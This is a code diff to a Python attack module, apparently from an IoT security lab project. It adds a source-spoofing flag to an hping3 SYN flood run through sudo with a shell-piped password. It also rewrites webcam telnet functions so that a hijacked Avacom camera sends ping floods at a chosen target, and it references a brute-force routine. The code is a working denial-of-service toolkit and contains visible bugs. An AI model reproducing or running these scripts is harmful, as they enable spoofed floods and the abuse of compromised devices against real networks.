@@ -21,7 +21,7 @@ def hPing3(ip, packets, pwd):
         pwd: <string> sudo password for machine running the attack
     """
 
-    command = 'hping3 -S -c ' + str(packets) +  ' --faster ' + ip
+    command = 'hping3 -S -c ' + str(packets) +  ' --faster --rand-source' + ip
     os.system('echo %s|sudo -S %s' % (str(pwd), command))
 #end hPing3
 
@@ -67,6 +67,7 @@ def bruteForce(ip, pwdFile, pwd):
 #end bruteForce
 
 def avacomCommand(ip, command):
+    # fix later, does not pass the command in proprely without hardcodimng it with a b in front of the string
     """
     This method passes a terminal command to the avacom webcam via telnet
         Parameters:
@@ -75,10 +76,28 @@ def avacomCommand(ip, command):
     """
     tn = AvacomControl.telnetIntoAvacom(ip)
     time.sleep(10)
-    tn.write(command)
+    newCommand = str(command) +" " + str(ip) + "\n"
+    tn.write(b"ping -s 50 -c 100 " + ip + "\n")
     
     time.sleep(10)
 #end avacomCommand
+
+def avacomPing(ip, target):
+    # fix later, does not pass the command in proprely without hardcodimng it with a b in front of the string
+    """
+    This method passes a terminal command to the avacom webcam via telnet
+        Parameters:
+        ip: <string> ip address of the avacom webcam
+        command: <string> command to be executed on the avacom webcam
+    """
+
+    tn = AvacomControl.telnetIntoAvacom(ip)
+    time.sleep(10)
+    tn.write(b"ping -s 50 -c 100 " + target + "\n")
+    
+    time.sleep(10)
+#end avacomCommand
+
 
 
 #avacomCommand("192.168.1.116","ping -s 5000 -c 100 192.168.1.100")
